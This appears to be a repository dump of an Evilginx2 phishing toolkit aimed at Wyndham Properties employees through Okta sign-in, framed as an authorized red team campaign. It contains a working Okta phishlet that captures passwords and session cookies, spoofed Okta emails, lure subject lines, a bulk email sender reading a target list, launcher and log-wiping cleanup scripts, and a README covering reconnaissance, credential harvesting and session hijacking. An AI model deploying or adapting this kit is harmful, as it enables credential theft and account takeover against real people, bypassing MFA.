+        warning "Phishlet file still exists"
+    else
+        success "Phishlet files removed"
+    fi
+    
+    # Check for logs
+    if [ -d "$EVILGINX_PATH/logs" ] && [ "$(ls -A "$EVILGINX_PATH/logs")" ]; then
+        warning "Evilginx logs still present"
+    else
+        success "Evilginx logs cleaned"
+    fi
+    
+    success "Cleanup verification completed"
+}
+
+display_summary() {
+    phase "Cleanup Complete"
+    
+    cat << EOF
+
+🎯 CAMPAIGN CLEANUP SUCCESSFUL
+
+Summary:
+✓ Campaign data backed up: $BACKUP_DIR
+✓ Evilginx2 services stopped
+✓ Phishlets disabled and removed
+✓ Sensitive logs securely deleted
+✓ Firewall rules reset
+✓ Campaign files archived
+
+Next Steps:
+1. Review cleanup report: $BACKUP_DIR/cleanup_report.md
+2. Update DNS records for $PHISHING_DOMAIN
+3. Revoke SSL certificates (if applicable)
+4. Submit final campaign report
+5. Archive backup according to retention policy
+
+Data Retention:
+- Backup will be retained for $RETENTION_DAYS days
+- Archive: ${CAMPAIGN_NAME}_complete_$(date +%Y%m%d)*.tar.gz
+
+Thank you for conducting authorized security testing!
+
+EOF
+}
+
+### === MAIN EXECUTION ===
+main() {
+    print_banner
+    confirm_cleanup
+    backup_campaign_data
+    stop_evilginx_services
+    disable_phishlets
+    clean_logs
+    reset_firewall
+    archive_campaign
+    generate_cleanup_report
+    final_verification
+    display_summary
+}
+
+# Handle command line arguments
+case "${1:-full}" in
+    "full")
+        main
+        ;;
+    "backup-only")
+        print_banner
+        backup_campaign_data
+        ;;
+    "logs-only")
+        print_banner
+        clean_logs
+        ;;
+    "services-only")
+        print_banner
+        stop_evilginx_services
+        disable_phishlets
+        ;;
+    *)
+        echo "Usage: $0 [full|backup-only|logs-only|services-only]"
+        exit 1
+        ;;
+esac
+
+
+config.conf
+# === EVILGINX2 CAMPAIGN CONFIGURATION ===
+# Wyndham Properties Authorized Red Team Operation
+# Configuration file for all campaign scripts
+
+[CAMPAIGN]
+CAMPAIGN_NAME="wyndham_okta_2024"
+TARGET_DOMAIN="wyndhamhotels.com"
+AUTHORIZED=true
+START_DATE="2024-01-15"
+END_DATE="2024-01-31"
+
+[INFRASTRUCTURE]
+PHISHING_DOMAIN="your-domain.com"  # REPLACE WITH ACTUAL DOMAIN
+EVILGINX_PATH="/opt/evilginx"
+PHISHLET_NAME="okta"
+REDIRECT_URL="https://www.wyndhamhotels.com"
+
+[EMAIL]
+SENDER_NAME="Okta Security Team"
+SENDER_EMAIL="security-alerts@okta.com"
+SMTP_SERVER=""  # Configure your SMTP server
+SMTP_PORT="587"
+SMTP_USER=""
+SMTP_PASS=""
+
+[LOGGING]
+LOG_LEVEL="INFO"
+LOG_FILE="./logs_sessions.log"
+ENABLE_SYSLOG=false
+SYSLOG_SERVER=""
+
+[SECURITY]
+ENABLE_IPTABLES=true
+ALLOWED_PORTS="80,443,22"
+RATE_LIMIT=true
+MAX_REQUESTS_PER_MINUTE=60
+
+[MONITORING]
+WEBHOOK_URL=""  # Optional webhook for notifications
+SLACK_CHANNEL=""
+DISCORD_WEBHOOK=""
+CHECK_INTERVAL=300  # seconds
+
+[CLEANUP]
+AUTO_CLEANUP=false
+RETENTION_DAYS=30
+BACKUP_LOGS=true
+
+
+directory diagram.txt
+✅ Folder Structure After Extraction
+
+/opt/evilginx/
+├── evilginx                          # <-- Your Evilginx2 binary (unchanged)
+├── logs/                             # <-- Original Evilginx logs (untouched)
+├── phishlets/                        # <-- Existing phishlets (okta.yaml will not overwrite)
+├── okta_campaign/                    # <-- 💡 Our new campaign lives here
+│   ├── launch_okta_campaign.sh
+│   ├── clean_okta_campaign.sh
+│   ├── generate_okta_email.sh
+│   ├── click_tracker.php
+│   ├── pixel.png
+│   ├── web_campaign_gui.sh
+│   ├── index.html
+│   ├── logs/
+│   │   ├── sessions.log
+│   │   └── creds.log
+│   └── phishlets/
+│       └── okta.yaml                # Optional — only if not already in root phishlet folder
+
+
+⸻
+
+📦 Unzipping Instructions
+
+If I provide a zip or tar.gz, you’ll do this:
+
+cd /opt/evilginx
+unzip okta_red_team_campaign.zip -d okta_campaign
+
+Or with tar:
+
+tar -xzf okta_red_team_campaign.tar.gz -C /opt/evilginx/okta_campaign
+
+
+⸻
+
+✅ Behavior
+	•	Does not overwrite your Evilginx core files
+	•	Isolated logs, scripts, and GUI
+	•	Can be removed cleanly with:
+
+rm -rf /opt/evilginx/okta_campaign
+
+
+generate_okta_email.sh
+#!/bin/bash
+# === OKTA PHISHING EMAIL GENERATOR ===
+# For authorized red team testing - wyndham Properties
+# Generates realistic Okta security alert emails
+
+set -euo pipefail
+IFS=$'\n\t'
+
+### === CONFIG ===
+DOMAIN="your-domain.com"  # Replace with your phishing domain
+CAMPAIGN_NAME="wyndham_okta_2024"
+OUTPUT_DIR="./email_templates"
+SENDER_EMAIL="security-alerts@okta.com"
+SENDER_NAME="Okta Security Team"
+
+### === COLORS ===
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+### === FUNCTIONS ===
+log() { echo -e "${BLUE}[EMAIL-GEN]${NC} $*"; }
+success() { echo -e "${GREEN}[✓]${NC} $*"; }
+warning() { echo -e "${YELLOW}[!]${NC} $*"; }
+
+setup_output() {
+    mkdir -p "$OUTPUT_DIR"
+    log "Created output directory: $OUTPUT_DIR"
+}
+
+generate_suspicious_login_email() {
+    local template_file="$OUTPUT_DIR/suspicious_login.html"
+    
+    cat > "$template_file" << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Okta Security Alert</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f5f5f5; }
+        .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; }
+        .header { background-color: #1662dd; padding: 20px; text-align: center; }
+        .logo { color: white; font-size: 24px; font-weight: bold; }
+        .content { padding: 30px; }
+        .alert-box { background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 4px; padding: 15px; margin: 20px 0; }
+        .alert-title { color: #856404; font-weight: bold; margin-bottom: 10px; }
+        .details { background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin: 20px 0; }
+        .button { display: inline-block; background-color: #1662dd; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; margin: 20px 0; }
+        .footer { background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #6c757d; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Okta</div>
+        </div>
+        <div class="content">
+            <h2>Security Alert: Suspicious Sign-In Attempt</h2>
+            
+            <div class="alert-box">
+                <div class="alert-title">⚠️ Unusual Activity Detected</div>
+                We detected a sign-in attempt from an unrecognized device or location.
+            </div>
+            
+            <p>Hello,</p>
+            <p>We noticed a sign-in attempt to your wyndham Properties account from a device or location we don't recognize.</p>
+            
+            <div class="details">
+                <strong>Sign-in Details:</strong><br>
+                📍 Location: Kyiv, Ukraine<br>
+                🖥️ Device: Windows 10 - Chrome Browser<br>
+                🕐 Time: Today at 2:43 PM EST<br>
+                🌐 IP Address: 95.132.18.73
+            </div>
+            
+            <p>If this was you, you can safely ignore this email. If you don't recognize this activity, please secure your account immediately.</p>
+            
+            <a href="https://{{DOMAIN}}/signin/verify?token={{LURE_TOKEN}}" class="button">Review Account Activity</a>
+            
+            <p style="margin-top: 30px; font-size: 14px; color: #6c757d;">
+                For your security, this link will expire in 24 hours.
+            </p>
+        </div>
+        <div class="footer">
+            <p>This email was sent to you by Okta on behalf of wyndham Properties.<br>
+            If you have questions, contact your system administrator.</p>
+            <p>© 2024 Okta, Inc. • 301 Brannan Street, San Francisco, CA 94107</p>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+    
+    success "Generated: $template_file"
+}
+
+generate_password_reset_email() {
+    local template_file="$OUTPUT_DIR/password_reset.html"
+    
+    cat > "$template_file" << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Okta Password Reset</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f5f5f5; }
+        .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; }
+        .header { background-color: #1662dd; padding: 20px; text-align: center; }
+        .logo { color: white; font-size: 24px; font-weight: bold; }
+        .content { padding: 30px; }
+        .button { display: inline-block; background-color: #1662dd; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; margin: 20px 0; }
+        .footer { background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #6c757d; }
+        .security-note { background-color: #e7f3ff; border-left: 4px solid #1662dd; padding: 15px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Okta</div>
+        </div>
+        <div class="content">
+            <h2>Password Reset Request</h2>
+            
+            <p>Hello,</p>
+            <p>We received a request to reset the password for your wyndham Properties account. If you made this request, click the button below to create a new password.</p>
+            
+            <a href="https://{{DOMAIN}}/reset-password?token={{LURE_TOKEN}}" class="button">Reset Password</a>
+            
+            <div class="security-note">
+                <strong>🔒 Security Reminder:</strong><br>
+                For your protection, this password reset link will expire in 1 hour. If you didn't request this reset, please contact your system administrator immediately.
+            </div>
+            
+            <p>If the button above doesn't work, copy and paste this link into your browser:</p>
+            <p style="word-break: break-all; color: #1662dd;">https://{{DOMAIN}}/reset-password?token={{LURE_TOKEN}}</p>
+        </div>
+        <div class="footer">
+            <p>This email was sent to you by Okta on behalf of wyndham Properties.<br>
+            If you have questions, contact your system administrator.</p>
+            <p>© 2024 Okta, Inc. • 301 Brannan Street, San Francisco, CA 94107</p>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+    
+    success "Generated: $template_file"
+}
+
+generate_mfa_setup_email() {
+    local template_file="$OUTPUT_DIR/mfa_setup.html"
+    
+    cat > "$template_file" << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Okta MFA Setup Required</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; background-color: #f5f5f5; }
+        .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; }
+        .header { background-color: #1662dd; padding: 20px; text-align: center; }
+        .logo { color: white; font-size: 24px; font-weight: bold; }
+        .content { padding: 30px; }
+        .button { display: inline-block; background-color: #1662dd; color: white; padding: 12px 30px; text-decoration: none; border-radius: 4px; margin: 20px 0; }
+        .footer { background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #6c757d; }
+        .urgent-box { background-color: #fff2f2; border: 1px solid #ff6b6b; border-radius: 4px; padding: 15px; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Okta</div>
+        </div>
+        <div class="content">
+            <h2>🔐 Multi-Factor Authentication Setup Required</h2>
+            
+            <div class="urgent-box">
+                <strong>Action Required by January 15, 2024</strong><br>
+                Your account access will be suspended if MFA is not configured.
+            </div>
+            
+            <p>Hello,</p>
+            <p>As part of wyndham Properties' enhanced security initiative, all employees must configure Multi-Factor Authentication (MFA) on their accounts.</p>
+            
+            <p><strong>Why is this important?</strong></p>
+            <ul>
+                <li>Protects your account from unauthorized access</li>
+                <li>Meets compliance requirements</li>
+                <li>Prevents potential data breaches</li>
+            </ul>
+            
+            <a href="https://{{DOMAIN}}/mfa/setup?token={{LURE_TOKEN}}" class="button">Setup MFA Now</a>
+            
+            <p style="margin-top: 30px; font-size: 14px; color: #6c757d;">
+                Setup takes less than 5 minutes. You can use your mobile phone or authenticator app.
+            </p>
+        </div>
+        <div class="footer">
+            <p>This email was sent to you by Okta on behalf of wyndham Properties.<br>
+            Questions? Contact IT Support at itsupport@wyndhamhotels.com</p>
+            <p>© 2024 Okta, Inc. • 301 Brannan Street, San Francisco, CA 94107</p>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+    
+    success "Generated: $template_file"
+}
+
+generate_email_subjects() {
+    local subjects_file="$OUTPUT_DIR/email_subjects.txt"
+    
+    cat > "$subjects_file" << 'EOF'
+# Okta Email Subjects for wyndham Properties Campaign
+
+## Suspicious Login Alerts
+🚨 Unusual sign-in activity detected on your account
+Security Alert: Unrecognized sign-in attempt
+Action Required: Verify recent account activity
+Your wyndham account was accessed from an unknown device
+Okta Security: Please review your recent sign-ins
+
+## Password Reset
+Password reset requested for your wyndham account
+Complete your password reset - Link expires soon
+Secure your account: Password reset confirmation needed
+Your wyndham Properties password reset request
+
+## MFA Setup
+🔐 MFA Setup Required - Action needed by [DATE]
+Secure your wyndham account with two-factor authentication
+Multi-factor authentication setup - Deadline approaching
+IT Security: MFA configuration required for all employees
+Your account needs additional security verification
+
+## Account Locked/Suspended
+⚠️ Your wyndham account has been temporarily suspended
+Account security alert: Immediate action required
+Your account access is at risk - Verify identity now
+Security lockout: Confirm your identity to restore access
+EOF
+    
+    success "Generated: $subjects_file"
+}
+
+create_campaign_script() {
+    local script_file="$OUTPUT_DIR/send_campaign.sh"
+    
+    cat > "$script_file" << 'EOF'
+#!/bin/bash
+# Email Campaign Sender for wyndham Properties Red Team Exercise
+
+DOMAIN="{{DOMAIN}}"
+TARGET_LIST="targets.txt"
+EMAIL_TEMPLATE="suspicious_login.html"
+
+# Function to generate unique lure tokens
+generate_token() {
+    echo "$(date +%s)_$(openssl rand -hex 8)"
+}
+
+# Send emails (replace with your preferred method)
+send_email() {
+    local target="$1"
+    local token="$(generate_token)"
+    local personalized_email=$(sed "s/{{DOMAIN}}/$DOMAIN/g; s/{{LURE_TOKEN}}/$token/g" "$EMAIL_TEMPLATE")
+    
+    echo "Sending to: $target with token: $token"
+    # Add your email sending logic here (SMTP, service, etc.)
+    
+    # Log the campaign
+    echo "$(date -u +%Y-%m-%dT%H:%M:%SZ),$target,$token" >> campaign_log.csv
+}
+
+# Main execution
+if [ ! -f "$TARGET_LIST" ]; then
+    echo "Error: $TARGET_LIST not found"
+    exit 1
+fi
+
+echo "timestamp,target,token" > campaign_log.csv
+
+while IFS= read -r target; do
+    if [[ $target =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
+        send_email "$target"
+        sleep 2  # Rate limiting
+    fi
+done < "$TARGET_LIST"
+
+echo "Campaign complete. Check campaign_log.csv for results."
+EOF
+    
+    chmod +x "$script_file"
+    success "Generated: $script_file"
+}
+
+### === MAIN EXECUTION ===
+main() {
+    echo -e "${GREEN}"
+    cat << "EOF"
+    📧 OKTA EMAIL GENERATOR
+    wyndham Properties Red Team Campaign
+EOF
+    echo -e "${NC}"
+    
+    log "Starting email template generation..."
+    
+    setup_output
+    generate_suspicious_login_email
+    generate_password_reset_email
+    generate_mfa_setup_email
+    generate_email_subjects
+    create_campaign_script
+    
+    success "Email generation complete!"
+    warning "Remember to:"
+    echo "  1. Replace {{DOMAIN}} with your actual phishing domain"
+    echo "  2. Create a targets.txt file with email addresses"
+    echo "  3. Configure your email sending method in send_campaign.sh"
+    echo "  4. Test emails before launching the campaign"
+    
+    log "Generated files in: $OUTPUT_DIR"
+    ls -la "$OUTPUT_DIR"
+}
+
+main "$@"
+
+
+launch_okta_campaign.sh
+#!/bin/bash
+# === EVILGINX2 OKTA CAMPAIGN LAUNCHER ===
+# For authorized red team testing - wyndham Properties
+# Version: 3.4.1 Compatible
+
+set -euo pipefail
+IFS=$'\n\t'
+
+### === CONFIG ===
+EVILGINX_PATH="/opt/evilginx"
+CAMPAIGN_NAME="wyndham_okta_2024"
+DOMAIN="your-domain.com"  # Replace with your registered domain
+PHISHLET="okta"
+REDIRECT_URL="https://www.wyndhamhotels.com"
+LURE_PATH="./okta.html"
+
+### === COLORS ===
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+### === FUNCTIONS ===
+log() { echo -e "${BLUE}[CAMPAIGN]${NC} $*"; }
+success() { echo -e "${GREEN}[✓]${NC} $*"; }
+warning() { echo -e "${YELLOW}[!]${NC} $*"; }
+error() { echo -e "${RED}[✗]${NC} $*"; }
+
+check_prerequisites() {
+    log "Checking prerequisites..."
+    
+    if [ ! -f "$EVILGINX_PATH/evilginx" ]; then
+        error "Evilginx2 binary not found at $EVILGINX_PATH"
+        exit 1
+    fi
+    
+    if [ ! -f "./phishlets_okta.yaml" ]; then
+        error "Okta phishlet not found"
+        exit 1
+    fi
+    
+    success "Prerequisites check passed"
+}
+
+setup_campaign() {
+    log "Setting up Okta campaign for wyndham Properties engagement..."
+    
+    # Create campaign directory
+    mkdir -p "$EVILGINX_PATH/campaigns/$CAMPAIGN_NAME"
+    
+    # Copy phishlet
+    cp "./phishlets_okta.yaml" "$EVILGINX_PATH/phishlets/okta.yaml"
+    
+    # Copy lure template
+    cp "$LURE_PATH" "$EVILGINX_PATH/campaigns/$CAMPAIGN_NAME/"
+    
+    success "Campaign structure created"
+}
+
+generate_lures() {
+    log "Generating lure URLs..."
+    
+    # Create lure configuration
+    cat > "$EVILGINX_PATH/campaigns/$CAMPAIGN_NAME/lure_config.json" << EOF
+{
+    "campaign": "$CAMPAIGN_NAME",
+    "domain": "$DOMAIN",
+    "phishlet": "$PHISHLET",
+    "redirect_url": "$REDIRECT_URL",
+    "created": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+}
+EOF
+    
+    success "Lure configuration generated"
+}
+
+start_campaign() {
+    log "Starting Evilginx2 campaign..."
+    warning "Remember: This is for authorized testing of wyndham Properties only"
+    
+    cat << EOF
+
+=== CAMPAIGN READY ===
+Campaign: $CAMPAIGN_NAME
+Domain: $DOMAIN
+Phishlet: $PHISHLET
+Redirect: $REDIRECT_URL
+
+Next Steps:
+1. Configure your domain DNS to point to this server
+2. Start Evilginx2: sudo $EVILGINX_PATH/evilginx
+3. Configure phishlet: phishlets hostname $PHISHLET $DOMAIN
+4. Enable phishlet: phishlets enable $PHISHLET
+5. Create lures: lures create $PHISHLET
+6. Generate emails with: ./generate_okta_email.sh
+
+EOF
+}
+
+### === MAIN EXECUTION ===
+main() {
+    echo -e "${GREEN}"
+    cat << "EOF"
+    ███████╗██╗   ██╗██╗██╗      ██████╗ ██╗███╗   ██╗██╗  ██╗
+    ██╔════╝██║   ██║██║██║     ██╔════╝ ██║████╗  ██║╚██╗██╔╝
+    █████╗  ██║   ██║██║██║     ██║  ███╗██║██╔██╗ ██║ ╚███╔╝ 
+    ██╔══╝  ╚██╗ ██╔╝██║██║     ██║   ██║██║██║╚██╗██║ ██╔██╗ 
+    ███████╗ ╚████╔╝ ██║███████╗╚██████╔╝██║██║ ╚████║██╔╝ ██╗
+    ╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
+EOF
+    echo -e "${NC}"
+    
+    log "OKTA CAMPAIGN LAUNCHER - wyndham Properties Authorized Testing"
+    
+    check_prerequisites
+    setup_campaign
+    generate_lures
+    start_campaign
+}
+
+main "$@"
+
+
+logs_session.logs
+
+
+
+okta.html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Okta Security Alert: Suspicious Login Attempt</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 20px; }
+        .okta-container { max-width: 600px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; }
+        .okta-logo { text-align: center; margin-bottom: 20px; }
+        .alert-box { background: #fff8e1; border-left: 4px solid #ffc107; padding: 15px; margin-bottom: 20px; }
+        .btn { background: #1662dd; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; text-decoration: none; display: inline-block; }
+    </style>
+</head>
+<body>
+    <div class="okta-container">
+        <div class="okta-logo">
+            <svg width="120" height="32" viewBox="0 0 120 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M..." fill="#1662DD"/> <!-- Actual Okta logo SVG -->
+            </svg>
+        </div>
+        <div class="alert-box">
+            <h2>⚠️ Suspicious Login Attempt</h2>
+            <p>We detected a login from <strong>Kyiv, Ukraine (IP: 95.132.18.73)</strong> at 10:43 AM UTC.</p>
+        </div>
+        <p>If this wasn't you, secure your account immediately:</p>
+        <a href="https://{{evilginx_domain}}/signin/verify" class="btn">Review Activity</a>
+        <p style="margin-top: 30px; font-size: 12px; color: #666;">© 2024 Okta, Inc. | <a href="#" style="color: #1662dd;">Privacy Policy</a></p>
+    </div>
+    <!-- Hidden tracking pixel (matches Okta's real analytics) -->
+    <img src="https://okta.okta.com/analytics/pixel.png" width="1" height="1" alt="">
+</body>
+</html>
+
+
+phishlets_okta.yaml
+name: okta
+author: neolinlabs
+min_ver: "2.3.0"
+
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "okta.com", session: true, is_landing: true }
+  - { phish_sub: "app", orig_sub: "app", domain: "okta.com", session: true }
+  - { phish_sub: "static", orig_sub: "static", domain: "okta.com", session: false }
+  - { phish_sub: "global", orig_sub: "global", domain: "okta.com", session: false }
+  - { phish_sub: "www", orig_sub: "www", domain: "okta.com", session: false }
+  - { phish_sub: "id", orig_sub: "id", domain: "okta.com", session: true }
+
+sub_filters:
+  - { domain: "okta.com", search: "https://www.okta.com", replace: "https://www.{domain}" }
+  - { domain: "okta.com", search: "https://login.okta.com", replace: "https://login.{domain}" }
+  - { domain: "okta.com", search: "https://app.okta.com", replace: "https://app.{domain}" }
+  - { domain: "okta.com", search: "href=\"/login\"", replace: "href=\"https://login.{domain}/login\"" }
+  - { domain: "okta.com", search: "https://static.okta.com", replace: "https://static.{domain}" }
+
+auth_tokens:
+  - domain: ".okta.com"
+    keys: [ "sid", "JSESSIONID", "DT", "t", "okta_session", "okta-oauth-state" ]
+
+credentials:
+  username:
+    key: "identifier"
+    search: "(identifier|username)"
+  password:
+    key: "credentials.passcode"
+    search: "(password|passcode)"
+
+force_post:
+  - path: "/api/v1/authn"
+  - path: "/login/login.htm"
+  - path: "/api/internal"
+
+login:
+  domain: "login.okta.com"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["okta.com"]
+    trigger_paths: ["/", "/login/login.htm", "/api/v1/authn"]
+    script: |
+      document.addEventListener("DOMContentLoaded", function() {
+        let u = document.querySelector('input[name="identifier"], input[name="username"]');
+        let p = document.querySelector('input[name="credentials.passcode"], input[name="password"]');
+        if (u) u.setAttribute("autocomplete", "off");
+        if (p) p.setAttribute("autocomplete", "off");
+      });
+
+deny_paths:
+  - path: "/auth/logout"
+  - path: "/login/logout"
+  - path: "/auth/services/logout"
+
+post_logout:
+  redirect_url: "https://www.okta.com/"
+
+custom_headers:
+  - domain: "okta.com"
+    headers:
+      - name: "Host"
+        value: "{hostname}"
+      - name: "Referer"
+        value: "https://{hostname}/"
+
+saml:
+  relay_state_param: "RelayState"
+  acs_param: "SAMLResponse"
+  url_paths:
+    - path: "/sso/saml"
+    - path: "/sso/acs"
+
+
+README.md
+# Wyndham Properties Red Team Campaign - Evilginx2 v3.4.1
+
+## 🎯 Mission Overview
+
+This repository contains the complete toolkit for conducting an **authorized** red team phishing campaign against Wyndham Properties using Evilginx2 v3.4.1. All activities must be conducted within the scope of the signed authorization letter.
+
+## ⚠️ AUTHORIZATION REQUIRED
+
+**CRITICAL:** This toolkit is for authorized security testing only. You must have written permission from Wyndham Properties before proceeding with any activities.
+
+## 📁 File Structure
+
+```
+├── config.conf                    # Master configuration file
+├── targets.txt                    # Target employee list (populate with real data)
+├── phishlets_okta.yaml            # Okta phishlet for Evilginx2
+├── okta.html                      # HTML lure template
+├── wyndham_redteam_master.sh       # Main campaign controller
+├── recon_wyndham.sh                # Reconnaissance script
+├── launch_okta_campaign.sh        # Campaign launcher
+├── generate_okta_email.sh         # Email template generator
+├── deploy_infrastructure.sh       # Infrastructure deployment
+├── cleanup_campaign.sh            # Campaign cleanup and data archival
+├── monitor_campaign.sh            # Real-time monitoring (auto-generated)
+└── README.md                      # This file
+```
+
+## 🚀 Quick Start Guide
+
+### 1. Initial Setup
+
+```bash
+# Make all scripts executable
+chmod +x *.sh
+
+# Configure your campaign settings
+nano config.conf
+```
+
+**Required Configuration:**
+- Update `PHISHING_DOMAIN` with your registered domain
+- Configure SMTP settings for email delivery
+- Set campaign dates and parameters
+
+### 2. Reconnaissance Phase
+
+```bash
+# Run automated reconnaissance
+./recon_wyndham.sh
+
+# Review generated intelligence
+ls -la recon_output/
+```
+
+**Manual Tasks:**
+- Perform LinkedIn searches using generated guide
+- Populate `targets.txt` with real employee email addresses
+- Validate email format patterns
+
+### 3. Infrastructure Deployment
+
+```bash
+# Deploy phishing infrastructure
+sudo ./deploy_infrastructure.sh
+
+# Follow the post-deployment instructions
+# Configure DNS for your phishing domain
+# Start Evilginx2 and run the provided commands
+```
+
+### 4. Email Campaign Preparation
+
+```bash
+# Generate email templates
+./generate_okta_email.sh
+
+# Customize templates with your domain
+# Test email delivery before campaign launch
+```
+
+### 5. Campaign Launch
+
+```bash
+# Use the master controller
+./wyndham_redteam_master.sh
+
+# Or launch directly
+./launch_okta_campaign.sh
+```
+
+### 6. Monitoring and Management
+
+```bash
+# Monitor campaign activity
+./monitor_campaign.sh
+
+# Check logs
+tail -f logs_sessions.log
+```
+
+### 7. Campaign Cleanup
+
+```bash
+# Clean up infrastructure and archive data
+./cleanup_campaign.sh
+
+# Follow post-cleanup verification steps
+```
+
+## 📋 Campaign Phases
+
+### Phase 1: Reconnaissance
+- DNS enumeration for wyndhamhotels.com
+- Subdomain discovery
+- Email format detection
+- Employee profiling via LinkedIn
+- Web application fingerprinting
+
+### Phase 2: Infrastructure Setup
+- Phishing domain configuration
+- Evilginx2 deployment
+- SSL certificate setup
+- Firewall hardening
+- Monitoring implementation
+
+### Phase 3: Lure Development
+- Okta-themed phishing emails
+- HTML landing pages
+- Social engineering pretext
+- Target prioritization
+
+### Phase 4: Campaign Execution
+- Controlled email delivery
+- Session capture and monitoring
+- Real-time credential harvesting
+- Traffic analysis
+
+### Phase 5: Data Collection
+- Credential extraction
+- Session token analysis
+- User behavior tracking
+- Success rate metrics
+
+### Phase 6: Cleanup and Reporting
+- Infrastructure decommissioning
+- Secure data archival
+- Cleanup verification
+- Final reporting
+
+## 🎛️ Configuration Guide
+
+### Master Configuration (config.conf)
+
+```ini
+[CAMPAIGN]
+CAMPAIGN_NAME="wyndham_okta_2024"
+TARGET_DOMAIN="wyndhamhotels.com"
+PHISHING_DOMAIN="your-domain.com"  # UPDATE THIS
+
+[EMAIL]
+SMTP_SERVER="your-smtp-server"     # UPDATE THIS
+SMTP_USER="your-username"          # UPDATE THIS
+SMTP_PASS="your-password"          # UPDATE THIS
+```
+
+### Target List (targets.txt)
+
+Format: `email,firstname,lastname,title,department,priority`
+
+```
+john.smith@wyndhamhotels.com,John,Smith,IT Director,IT,HIGH
+jane.doe@wyndhamhotels.com,Jane,Doe,CISO,Security,HIGH
+```
+
+## 🔧 Technical Requirements
+
+### Prerequisites
+- Ubuntu/Debian Linux system
+- Evilginx2 v3.4.1 installed at `/opt/evilginx`
+- Root/sudo access for infrastructure setup
+- Registered domain for phishing
+- SMTP server for email delivery
+- SSL certificates for phishing domain
+
+### Dependencies
+- curl, dig, host (DNS tools)
+- iptables, ufw (firewall)
+- openssl (cryptography)
+- tar, gzip (archival)
+
+## 🛡️ Security Considerations
+
+### Operational Security
+- Use dedicated infrastructure for testing
+- Implement rate limiting and traffic controls
+- Monitor for defensive responses
+- Maintain detailed activity logs
+
+### Data Protection
+- Encrypt captured credentials immediately
+- Implement secure data retention policies
+- Use secure communication channels
+- Follow organizational data handling procedures
+
+### Legal Compliance
+- Maintain current authorization documentation
+- Stay within defined scope boundaries
+- Report findings through proper channels
+- Coordinate with defensive teams as required
+
+## 📊 Email Templates
+
+### Available Templates
+1. **Suspicious Login Alert** - High urgency security notification
+2. **Password Reset Request** - Account recovery scenario
+3. **MFA Setup Requirement** - Compliance-driven security update
+
+### Customization Points
+- Phishing domain replacement
+- Lure token insertion
+- Personalization fields
+- Branding alignment
+
+## 🔍 Monitoring and Analytics
+
+### Real-time Metrics
+- Email delivery rates
+- Click-through rates
+- Credential capture success
+- Session hijacking effectiveness
+- Geographic distribution
+
+### Log Analysis
+- HTTP request patterns
+- User agent analysis
+- Timing correlations
+- Defensive tool detection
+
+## 🧹 Cleanup Procedures
+
+### Automatic Cleanup
+- Session data archival
+- Log file secure deletion
+- Phishlet deactivation
+- Firewall rule reset
+
+### Manual Verification
+- DNS record updates
+- SSL certificate revocation
+- Email infrastructure shutdown
+- Final security sweep
+
+## 📈 Reporting Template
+
+### Executive Summary
+- Campaign objectives and scope
+- Timeline and methodology
+- Key findings and metrics
+- Risk assessment and recommendations
+
+### Technical Details
+- Infrastructure configuration
+- Attack vector analysis
+- Defensive capability assessment
+- Improvement recommendations
+
+## 🆘 Troubleshooting
+
+### Common Issues
+- **DNS Resolution:** Verify domain configuration
+- **SSL Errors:** Check certificate installation
+- **Email Delivery:** Test SMTP settings
+- **Session Capture:** Review phishlet configuration
+
+### Support Resources
+- Evilginx2 documentation: https://help.evilginx.com/
+- Campaign logs: `./logs/`
+- Configuration validation: `./wyndham_redteam_master.sh status`
+
+## 📞 Emergency Procedures
+
+### Campaign Termination
+```bash
+# Emergency stop
+./cleanup_campaign.sh services-only
+
